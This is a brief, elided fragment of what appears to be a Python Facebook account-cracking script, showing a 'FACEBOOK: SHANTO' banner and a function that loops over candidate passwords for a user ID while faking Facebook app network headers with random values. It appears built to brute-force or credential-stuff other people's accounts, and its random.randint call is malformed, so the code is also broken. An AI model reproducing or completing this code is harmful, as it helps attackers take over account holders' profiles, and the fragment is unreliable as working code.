...
\033[1;32m[✓]FACEBOOK:\033[1;32m SHANTO
...
def file_subb(uid,pwx):
    ...
    try:
        for ps in pwx:
            ...
            'X-FB-Net-HNI': str(random.randint(20000, 30000,40000,50000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 30000,40000,50000)),
